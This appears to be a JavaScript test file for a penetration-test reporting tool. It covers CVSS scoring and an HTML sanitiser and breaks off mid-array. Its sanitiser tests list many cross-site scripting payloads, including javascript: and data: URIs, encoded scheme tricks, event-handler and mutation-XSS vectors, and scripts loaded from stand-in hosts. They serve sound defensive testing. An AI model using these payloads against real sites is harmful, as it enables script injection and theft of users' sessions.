process.env.TZ="UTC"
const path=require("path")
const ROOT=path.resolve(__dirname,"..","..")
const RC=require(path.join(ROOT,"UI","js","pages","reporting_core.js"))
let passed=0,failed=0
function check(name,cond,detail){if(cond){passed++;return}failed++;console.log("  FAIL  "+name+(detail?"  ->  "+detail:""))}
function eq(name,a,b){check(name,JSON.stringify(a)===JSON.stringify(b),JSON.stringify(a)+" != "+JSON.stringify(b))}
const S=RC.sanitizeHtml

// ---- tables ----
eq("severity ids",RC.SEVERITIES.map((s)=>s.id),["critical","high","medium","low","info"])
eq("severity export palette",RC.SEVERITIES.map((s)=>s.color),["#9b1c1c","#dc2626","#f59e0b","#2563eb","#6b7280"])
eq("status ids",RC.STATUSES.map((s)=>s.id),["open","retest","fixed","accepted"])
eq("sevLabel info",RC.sevLabel("info"),"Informational")
eq("sevLabel unknown",RC.sevLabel("bogus"),"Informational")
eq("sevLabel critical",RC.sevLabel("critical"),"Critical")
eq("owasp list has ten",RC.OWASP_TOP10.length,10)

// ---- sevFromScore boundaries ----
;[[0,"info"],[null,"info"],[undefined,"info"],["","info"],[0.1,"low"],[3.9,"low"],[4.0,"medium"],[6.9,"medium"],[7.0,"high"],[8.9,"high"],[9.0,"critical"],[10,"critical"],["7.5","high"],["x","info"]].forEach((c)=>eq("sevFromScore "+JSON.stringify(c[0]),RC.sevFromScore(c[0]),c[1]))

// ---- CVSS v3.1 known scores (NVD calculator) ----
const VECTORS=[
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",9.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",10.0],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",0.0],
["CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:C/C:N/I:N/A:N",0.0],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",5.3],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",7.5],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",7.5],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",8.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",8.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",6.1],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",4.3],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",4.3],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",5.4],
["CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",7.8],
["CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",8.1],
["CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",7.2],
["CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",9.1],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",9.9],
["CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",3.1],
["CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",6.8],
["CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",8.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",6.5],
["CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",5.9],
["CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",7.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",5.8],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",9.1],
["CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N",1.8],
["CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N",1.6],
["CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",9.6],
["CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",8.2],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",6.5],
["CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N",6.4]
]
VECTORS.forEach((v)=>eq("cvss "+v[0],RC.cvssScore(v[0]),v[1]))
eq("cvss 3.0 prefix accepted",RC.cvssScore("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),9.8)
eq("cvss no prefix, any order, lower case",RC.cvssScore("a:h/i:h/c:h/s:u/ui:n/pr:n/ac:l/av:n"),9.8)
eq("cvss temporal metrics ignored",RC.cvssScore("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C"),9.8)
eq("cvss whitespace trimmed",RC.cvssScore("  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \n"),9.8)
;["","CVSS:3.1/","AV:N","CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P","CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N","CVSS:3.1/AV:X/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","CVSS:3.1/AV:N/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/ZZ:1","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/__proto__:N","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:constructor",null,undefined,42].forEach((v)=>{
eq("cvss invalid "+JSON.stringify(v),RC.cvssScore(v),null)
const p=RC.cvssParse(v)
check("cvss invalid has error "+JSON.stringify(v),p.valid===false&&typeof p.error==="string"&&p.error.length>0)
})
const parsed=RC.cvssParse("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N")
eq("cvssParse metrics",parsed.metrics,{AV:"N",AC:"L",PR:"N",UI:"R",S:"C",C:"L",I:"L",A:"N"})
eq("cvssParse valid",parsed.valid,true)
eq("cvssBuild canonical order",RC.cvssBuild({A:"N",I:"L",C:"L",S:"C",UI:"R",PR:"N",AC:"L",AV:"N"}),"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N")
VECTORS.forEach((v)=>eq("cvss round trip "+v[0],RC.cvssBuild(RC.cvssParse(v[0]).metrics),v[0]))
// Every one of the 2592 base vectors: one decimal, within range, and zero exactly when there is no impact.
;(function(){
let bad=0,count=0
const M=RC.CVSS_METRICS
function walk(i,acc){
if(i===M.length){
count++
const sc=RC.cvssScore(RC.cvssBuild(acc))
const noImpact=acc.C==="N"&&acc.I==="N"&&acc.A==="N"
if(typeof sc!=="number"||sc<0||sc>10||Math.abs(sc*10-Math.round(sc*10))>1e-9||(noImpact?sc!==0:sc<=0))bad++
return
}
M[i].values.forEach((v)=>{const o=Object.assign({},acc);o[M[i].key]=v.v;walk(i+1,o)})
}
walk(0,{})
eq("all base vectors enumerated",count,2592)
eq("all base vectors score sanely",bad,0)
})()

// ---- escapeHtml ----
eq("escapeHtml",RC.escapeHtml("<a href=\"x\" title='y'>&</a>"),"&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;")
eq("escapeHtml null",RC.escapeHtml(null),"")
eq("escapeHtml number",RC.escapeHtml(5),"5")

// ---- sanitiser: allowed subset passes through unchanged ----
const CLEAN=[
"<p>Hello <strong>bold</strong> <b>b</b> <em>em</em> <i>i</i> <u>u</u> <s>s</s> <code>x=1</code></p>",
"<h3>Title</h3><h4>Sub</h4><blockquote><p>q</p></blockquote>",
"<ul><li>a</li><li>b</li></ul><ol><li>1</li></ol>",
"<pre>line1\nline2  &lt;b&gt;</pre><hr><p>a<br>b</p>",
"<p><a href=\"https://example.com/a?b=1&amp;c=2\">link</a> <a href=\"http://x.test\">h</a> <a href=\"mailto:a@b.c\">m</a></p>",
"<table><thead><tr><th>H</th><th colspan=\"2\">W</th></tr></thead><tbody><tr><td rowspan=\"3\">a</td><td>b</td></tr></tbody></table>",
"<p><img src=\"rptasset:ab12-CD_34\" alt=\"shot\" data-width=\"60%\"></p>",
"<figure class=\"rpt-ev\" data-evidence=\"ev-123\"><figcaption>$ id \u2014 exit 0</figcaption><pre>uid=0(root)</pre></figure>",
"<p>The password is <span class=\"rpt-redact\">hunter2</span>.</p>",
"<pre data-lang=\"bash\">ls -la</pre><pre data-lang=\"C++\">x</pre><pre data-lang=\"objective-c_2.0#\">y</pre>",
"<p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; &quot;q&quot; &#39; &#x27; &nbsp; &eacute;</p>"
]
CLEAN.forEach((h,i)=>eq("clean subset unchanged #"+i,S(h),h))
CLEAN.forEach((h,i)=>eq("idempotent #"+i,S(S(h)),S(h)))

// ---- sanitiser: exact results ----
const EXACT=[
["<div>a</div><div>b</div>","ab"],
["<p style=\"color:red\" class=\"x\" id=\"y\" onclick=\"z()\">t</p>","<p>t</p>"],
["<P>Upper</P><STRONG>x</STRONG>","<p>Upper</p><strong>x</strong>"],
["<script>alert(1)</script>after","after"],
["<SCRIPT SRC=//x.test/a.js></SCRIPT>after","after"],
["<style>p{color:red}</style>x","x"],
["a<iframe src=\"https://x.test\">inner</iframe>b","ab"],
["a<object data=\"x\"><param name=a value=b>fallback</object>b","ab"],
["a<svg onload=alert(1)><circle r=1></circle><script>alert(1)</script></svg>b","ab"],
["a<svg><svg></svg><b>still inside</b></svg>b","ab"],
["a<form action=\"x\"><input name=q>inner</form>b","ab"],
["a<math><mi>x</mi></math>b","ab"],
["<textarea><p>x</p></textarea>y","y"],
["<title><b>x</b></title>y","y"],
["<noscript><p>x</p></noscript>y","y"],
["<embed src=x>after","after"],
["<link rel=stylesheet href=x>after<meta http-equiv=refresh content=\"0;url=x\">!","after!"],
["<base href=\"https://evil.test/\">x","x"],
["<!-- comment <script>alert(1)</script> -->x","x"],
["<!--[if gte mso 9]><xml><o:p>x</o:p></xml><![endif]-->y","y"],
["<!--><script>alert(1)</script>-->x","--&gt;x"],
["<!DOCTYPE html><p>x</p>","<p>x</p>"],
["<?xml version=\"1.0\"?><p>x</p>","<p>x</p>"],
["<![CDATA[<script>alert(1)</script>]]>x","alert(1)]]&gt;x"],
["<o:p>word</o:p><font color=red><span style=\"mso-x:1\">w</span></font>","wordw"],
["<span>plain</span><span class=\"a rpt-redact b\">r</span><span class=\"rpt-redacted\">n</span>","plain<span class=\"rpt-redact\">r</span>n"],
["<figure class=\"other\" data-evidence=\"bad uid!\" onclick=x><figcaption>c</figcaption></figure>","<figure class=\"rpt-ev\"><figcaption>c</figcaption></figure>"],
["<a href=\"javascript:alert(1)\">x</a>","x"],
["<a href=\"JaVaScRiPt:alert(1)\">x</a>","x"],
["<a href=\"java\nscript:alert(1)\">x</a>","x"],
["<a href=\"java\tscript:alert(1)\">x</a>","x"],
["<a href=\"java&#10;script:alert(1)\">x</a>","x"],
["<a href=\"java&#x09;script:alert(1)\">x</a>","x"],
["<a href=\"&#106;avascript:alert(1)\">x</a>","x"],
["<a href=\"&#x6A;&#x61;vascript&colon;alert(1)\">x</a>","x"],
["<a href=\"&#0000106avascript:alert(1)\">x</a>","x"],
["<a href=\" \u0001javascript:alert(1)\">x</a>","x"],
["<a href=\"jav\u0000ascript:alert(1)\">x</a>","x"],
["<a href=\"data:text/html,<script>alert(1)</script>\">x</a>","x"],
["<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>","x"],
["<a href=\"vbscript:msgbox(1)\">x</a>","x"],
["<a href=\"file:///etc/passwd\">x</a>","x"],
["<a href=\"//evil.test\">x</a>","x"],
["<a href=\"/relative\">x</a>","x"],
["<a href=\"#frag\">x</a>","x"],
["<a href=\"ftp://x.test\">x</a>","x"],
["<a href=\"https:evil\">x</a>","x"],
["<a href=\"http://\">x</a>","x"],
["<a>x</a>","x"],
["<a href=javascript:alert(1)>x</a>","x"],
["<a href='javascript:alert(1)'>x</a>","x"],
["<a href=`javascript:alert(1)`>x</a>","x"],
["<a href=\"  https://ok.test/p  \">x</a>","<a href=\"https://ok.test/p\">x</a>"],
["<a href=\"HTTPS://OK.test\">x</a>","<a href=\"HTTPS://OK.test\">x</a>"],
["<a href=https://ok.test/a\"b>x</a>","<a href=\"https://ok.test/a&quot;b\">x</a>"],
["<a href=\"https://ok.test/\" onclick=\"alert(1)\" target=_blank style=\"x\" href=\"javascript:1\">x</a>","<a href=\"https://ok.test/\">x</a>"],
["<a href=\"javascript:1\" href=\"https://ok.test/\">x</a>","x"],
["<a href=\"https://ok.test/&quot; onmouseover=&quot;alert(1)\">x</a>","<a href=\"https://ok.test/&quot; onmouseover=&quot;alert(1)\">x</a>"],
["<a href=\"mailto:a@b.c?subject=x\">m</a>","<a href=\"mailto:a@b.c?subject=x\">m</a>"],
["<img src=x onerror=alert(1)>","",],
["<img src=\"https://x.test/a.png\">",""],
["<img src=\"data:image/png;base64,AAAA\">",""],
["<img src=\"rptasset:ok1\" onerror=\"alert(1)\" onload=x style=\"x\" width=10 srcset=\"x 1x\">","<img src=\"rptasset:ok1\">"],
["<img src=\"rptasset:a b\">",""],
["<img src=\"rptasset:../../x\">",""],
["<img src=\"rptasset:\">",""],
["<img src=\"rptasset:x&quot; onerror=&quot;1\">",""],
["<img src=\"RPTASSET:x\">",""],
["<img src=\"rptasset:ok\" alt=\"a&quot;b<c>\" data-width=\"expression(1)\">","<img src=\"rptasset:ok\" alt=\"a&quot;b&lt;c&gt;\">"],
["<img/src=\"rptasset:ok\"/onerror=alert(1)>","<img src=\"rptasset:ok\">"],
["<img src=\"rptasset:ok\"onerror=\"alert(1)\">","<img src=\"rptasset:ok\">"],
["<td colspan=\"0\" rowspan=\"99999\">x</td>","<td>x</td>"],
["<td colspan=\"2&quot; onclick=&quot;x\" rowspan=3>x</td>","<td colspan=\"2\" rowspan=\"3\">x</td>"],
["<p onmouseover=alert(1)>x</p>","<p>x</p>"],
["<p ONCLICK=\"alert(1)\">x</p>","<p>x</p>"],
["<p on\u0000click=\"alert(1)\">x</p>","<p>x</p>"],
["<p/onclick=alert(1)>x</p>","<p>x</p>"],
["<p\nonclick\n=\nalert(1)\n>x</p>","<p>x</p>"],
["<b title=\"><script>alert(1)</script>\">x</b>","<b>x</b>"],
["<b title='\"><img src=x onerror=alert(1)>'>x</b>","<b>x</b>"],
["<b title=a\"><img src=x onerror=alert(1)>x</b>","<b>x</b>"],
["<p title=\"</p><script>alert(1)</script>\">x</p>","<p>x</p>"],
["<scr<script>ipt>alert(1)</script>","ipt&gt;alert(1)"],
["<<script>alert(1)//<</script>","&lt;"],
["<scr\u0000ipt>alert(1)</scr\u0000ipt>x","x"],
["<script>alert('</scr'+'ipt>')</script>x","x"],
["<script >a</script >b","b"],
["<script\n>a</script\n>b","b"],
["<script/x>a</script/x>b","b"],
["<script>a</script foo=\">\">b","b"],
["<script>never closed <p>x</p>",""],
["<style>never closed <p>x</p>",""],
["<iframe>never closed",""],
["<svg><p>never closed",""],
["text <p unterminated=\"",  "text "],
["text <p unterminated","text "],
["<p>x</p><b",  "<p>x</p>"],
["<!-- never closed <p>x</p>",""],
["1 < 2 and 3 > 2 & so on","1 &lt; 2 and 3 &gt; 2 &amp; so on"],
["a <- b, x<3, </ >, <>","a &lt;- b, x&lt;3, &lt;/ &gt;, &lt;&gt;"],
["&lt;script&gt;alert(1)&lt;/script&gt;","&lt;script&gt;alert(1)&lt;/script&gt;"],
["&#60;script&#62;alert(1)&#60;/script&#62;","&#60;script&#62;alert(1)&#60;/script&#62;"],
["&#x3c;img src=x onerror=alert(1)&#x3e;","&#x3c;img src=x onerror=alert(1)&#x3e;"],
["&amp;lt;b&amp;gt; &bogus &; &#; &#xZZ; AT&T","&amp;lt;b&amp;gt; &amp;bogus &amp;; &amp;#; &amp;#xZZ; AT&amp;T"],
["<p>unclosed <strong>bold","<p>unclosed <strong>bold</strong></p>"],
["<b><i>x</b>y</i>","<b><i>x</i></b>y"],
["</p></div></script>x","x"],
["<p>a<p>b","<p>a</p><p>b</p>"],
["<ul><li>a<li>b</ul>","<ul><li>a</li><li>b</li></ul>"],
["<ul><li>a<ul><li>n</li></ul></li></ul>","<ul><li>a<ul><li>n</li></ul></li></ul>"],
["<td><p>a<p>b</td>","<td><p>a</p><p>b</p></td>"],
["<br/><hr /><br></br>","<br><hr><br>"],
["<h1>big</h1><h2>x</h2><h5>y</h5>","bigxy"],
["<input value=x><button onclick=x>b</button><select><option>o</option></select>t","t"],
["<video src=x onerror=alert(1)><source onerror=alert(1)></video><audio src=x></audio>t","t"],
["<details open ontoggle=alert(1)><summary>s</summary>d</details>","sd"],
["<marquee onstart=alert(1)>m</marquee><body onload=alert(1)>b</body><html>h</html>","mbh"],
["<isindex action=javascript:alert(1) type=image>x","x"],
["<xss style=\"behavior:url(x)\">x</xss><x:script>alert(1)</x:script>","xalert(1)"],
["<p>\u202e<b>rtl</b></p>","<p>\u202e<b>rtl</b></p>"],
["",""],
[null,""],
[undefined,""],
[42,"42"]
]
EXACT.forEach((c)=>eq("sanitise "+JSON.stringify(c[0]),S(c[0]),c[1]))

// ---- sanitiser: invariants over a wide payload table (no tag outside the subset, no handler, no bad scheme survives) ----
const PAYLOADS=[
"<script>alert(1)</script>","<ScRiPt>alert(1)</sCrIpT>","<script src=http://x.test/x.js></script>","<script\n>alert(1)</script\n>","<script\u000c>alert(1)</script>",
"<img src=x onerror=alert(1)>","<img src=x onerror=\"alert(1)\">","<IMG SRC=\"javascript:alert('XSS');\">","<IMG SRC=JaVaScRiPt:alert('XSS')>","<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">","<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","<IMG SRC=# onmouseover=\"alert('xxs')\">","<IMG SRC= onmouseover=\"alert('xxs')\">","<IMG onmouseover=\"alert('xxs')\">",
"<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>","<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
"<IMG SRC=\"jav\tascript:alert('XSS');\">","<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">","<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">","<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">","<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
"<SCRIPT/XSS SRC=\"http://x.test/xss.js\"></SCRIPT>","<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>","<SCRIPT/SRC=\"http://x.test/xss.js\"></SCRIPT>","<<SCRIPT>alert(\"XSS\");//<</SCRIPT>","<SCRIPT SRC=http://x.test/xss.js?< B >",
"<SCRIPT SRC=//x.test/.j>","<IMG SRC=\"javascript:alert('XSS')\"","<iframe src=http://x.test/scriptlet.html <","\";alert('XSS');//","</script><script>alert('XSS');</script>",
"</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>","<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">","<BODY BACKGROUND=\"javascript:alert('XSS')\">","<IMG DYNSRC=\"javascript:alert('XSS')\">","<IMG LOWSRC=\"javascript:alert('XSS')\">",
"<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>","<IMG SRC='vbscript:msgbox(\"XSS\")'>","<svg/onload=alert('XSS')>","<svg><script>alert(1)</script></svg>","<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>",
"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","<svg><style><img src=x onerror=alert(1)></style></svg>","<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>","<math><a xlink:href=\"javascript:alert(1)\">x</a></math>",
"<BODY ONLOAD=alert('XSS')>","<BGSOUND SRC=\"javascript:alert('XSS');\">","<BR SIZE=\"&{alert('XSS')}\">","<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">","<STYLE>@import'http://x.test/xss.css';</STYLE>",
"<META HTTP-EQUIV=\"Link\" Content=\"<http://x.test/xss.css>; REL=stylesheet\">","<STYLE>BODY{-moz-binding:url(\"http://x.test/xssmoz.xml#xss\")}</STYLE>","<XSS STYLE=\"behavior: url(xss.htc);\">","<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
"<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>","<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">","<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>","<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>","<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>","<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
"<TABLE BACKGROUND=\"javascript:alert('XSS')\">","<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">","<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">","<DIV STYLE=\"width: expression(alert('XSS'));\">",
"<BASE HREF=\"javascript:alert('XSS');//\">","<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://x.test/scriptlet.html\"></OBJECT>","<EMBED SRC=\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
"<SCRIPT a=\">\" SRC=\"http://x.test/xss.js\"></SCRIPT>","<SCRIPT =\">\" SRC=\"http://x.test/xss.js\"></SCRIPT>","<SCRIPT a=\">\" '' SRC=\"http://x.test/xss.js\"></SCRIPT>","<SCRIPT \"a='>'\" SRC=\"http://x.test/xss.js\"></SCRIPT>",
"<SCRIPT a=`>` SRC=\"http://x.test/xss.js\"></SCRIPT>","<SCRIPT a=\">'>\" SRC=\"http://x.test/xss.js\"></SCRIPT>","<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://x.test/xss.js\"></SCRIPT>",
"<A HREF=\"javascript:document.location='http://x.test/'\">XSS</A>","<a href=\"jAvAsCrIpT:alert(1)\">x</a>","<a href=\"\u0001javascript:alert(1)\">x</a>","<a href=\"javascript&colon;alert(1)\">x</a>","<a href=\"java&NewLine;script&colon;alert(1)\">x</a>",
"<a href=\"java&Tab;script:alert(1)\">x</a>","<a href=\"&#x6a;avascript:alert(1)\">x</a>","<a href=\"\u00a0javascript:alert(1)\">x</a>","<a href=\"\u2028javascript:alert(1)\">x</a>","<a href=\"javascript:alert(1)\">x</a>",
"<a href=\"data:text/html,<script>alert(1)</script>\">x</a>","<a href=\"DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg\">x</a>","<a href=\"feed:javascript:alert(1)\">x</a>","<a href=\"view-source:javascript:alert(1)\">x</a>",
"<a href=\"https://ok.test\" onclick=alert(1)>x</a>","<a href=\"https://ok.test\" onfocus=alert(1) autofocus>x</a>","<a href=\"https://ok.test\" style=\"position:fixed;inset:0\">x</a>","<a href=\"https://ok.test\" target=\"_blank\" rel=\"opener\">x</a>",
"<p onpointerdown=alert(1)>x</p>","<p onanimationstart=alert(1) style=\"animation:x 1s\">x</p>","<p contenteditable onbeforeinput=alert(1)>x</p>","<p draggable=true ondragstart=alert(1)>x</p>","<p id=x tabindex=1 onfocusin=alert(1)>x</p>",
"<details open ontoggle=alert(1)>","<select autofocus onfocus=alert(1)>","<textarea autofocus onfocus=alert(1)>","<keygen autofocus onfocus=alert(1)>","<video><source onerror=\"alert(1)\">","<audio src=x onerror=alert(1)>",
"<input onfocus=alert(1) autofocus>","<button formaction=javascript:alert(1)>x</button>","<form><button formaction=javascript:alert(1)>x</button></form>","<form action=javascript:alert(1)><input type=submit>",
"<isindex type=image src=1 onerror=alert(1)>","<object data=javascript:alert(1)>","<embed src=javascript:alert(1)>","<applet code=x></applet>","<marquee onstart=alert(1)>","<meta charset=\"x\" http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">",
"<template><script>alert(1)</script></template>","<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">","<xmp><script>alert(1)</script></xmp>","<plaintext><script>alert(1)</script>","<listing><img src=x onerror=alert(1)></listing>",
"<title><img src=x onerror=alert(1)></title>","<textarea><img src=x onerror=alert(1)></textarea>","<noembed><img src=x onerror=alert(1)></noembed>","<noframes><img src=x onerror=alert(1)></noframes>",
"<!--<img src=\"--><img src=x onerror=alert(1)//\">","<!--[if]><script>alert(1)</script -->","<![if !IE]><script>alert(1)</script><![endif]>","<? foo=\"><script>alert(1)</script>\">","<! foo=\"><script>alert(1)</script>\">",
"</ foo=\"><script>alert(1)</script>\">","<% foo><x foo=\"%><script>alert(1)</script>\">","<img src=\"rptasset:x\" onerror=alert(1)>","<img src=\"rptasset:x\"onerror=alert(1)>","<img src=rptasset:x onerror=alert(1)>","<img src='rptasset:x'/onerror=alert(1)>",
"<img src=\"rptasset:x\" alt=\"\" onerror=\"alert(1)\">","<img src=\"rptasset:x\" alt='\"><script>alert(1)</script>'>","<img alt=\"<script>alert(1)</script>\" src=\"rptasset:x\">","<img src=\"rptasset:x\" data-width=\"1&quot; onerror=&quot;alert(1)\">",
"<figure class=\"rpt-ev\" onclick=alert(1) data-evidence='\"><script>alert(1)</script>'>x</figure>","<span class=\"rpt-redact\" onmouseover=alert(1) style=\"x\">x</span>","<span class='rpt-redact\"><script>alert(1)</script>'>x</span>",
"<td colspan=\"1 onclick=alert(1)\">x</td>","<td colspan='2\" onclick=\"alert(1)'>x</td>","<th rowspan=2 onclick=alert(1) background=javascript:alert(1)>x</th>",
"<p\u0000 onclick=alert(1)>x</p>","<p \u0000onclick=alert(1)>x</p>","<\u0000script>alert(1)</script>","<s\u0000cript>alert(1)</s\u0000cript>","<script\u0000>alert(1)</script>",
"<a href=\"https://ok.test\"\u0000onclick=alert(1)>x</a>","<a href=https://ok.test\u0000 onclick=alert(1)>x</a>","<a href=\"ht\ntps://ok.test\" onclick=alert(1)>x</a>",
"<b <script>alert(1)</script>>x</b>","<b x=\"<script>alert(1)</script>\">x</b>","<b x='<script>alert(1)</script>'>x</b>","<b x=<script>alert(1)</script>>x</b>","<b/<script>alert(1)</script>",
"<p><svg><p><style><!--</style><img src=x onerror=alert(1)>-->","<p><math><p><annotation-xml encoding=\"text/html\"><script>alert(1)</script>","<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>","<noscript><style></noscript><img src=x onerror=alert(1)>","<table><style><img src=x onerror=alert(1)></style></table>",
"<a href=\"https://ok.test\"><script>alert(1)</script></a>","<pre><script>alert(1)</script></pre>","<code><img src=x onerror=alert(1)></code>","<blockquote cite=\"javascript:alert(1)\">x</blockquote>",
"<ul><li onclick=alert(1) style=\"x\">x","<ol start=\"1\" onwheel=alert(1)><li value=\"x\">x","<hr onmouseover=alert(1)>","<br onmouseover=alert(1) clear=all>","<h3 onclick=alert(1)>x</h3>",
"&lt;script&gt;alert(1)&lt;/script&gt;","&#60;script&#62;alert(1)&#60;/script&#62;","&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;","&lt;img src=x onerror=alert(1)&gt;","&amp;lt;script&amp;gt;",
"<p>&lt;img src=x onerror=alert(1)&gt;</p>","<a href=\"https://ok.test/?q=&lt;script&gt;alert(1)&lt;/script&gt;\">x</a>","<a href=\"https://ok.test/'onclick='alert(1)\">x</a>","<a href='https://ok.test/\"onclick=\"alert(1)'>x</a>",
"<a href=https://ok.test/\"onclick=\"alert(1)>x</a>","<a href=\"https://ok.test/&#34; onclick=&#34;alert(1)\">x</a>","<a href=\"https://ok.test/&#x22;&#x3e;&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;\">x</a>",
"<a href=\"mailto:a@b.c&#34; onclick=&#34;alert(1)\">x</a>","<a href=\"mailto:x\" onclick=alert(1)>m</a>","<a\thref=\"javascript:alert(1)\">x</a>","<a\nhref\n=\n\"javascript:alert(1)\"\n>x</a>","<a/href=javascript:alert(1)>x</a>",
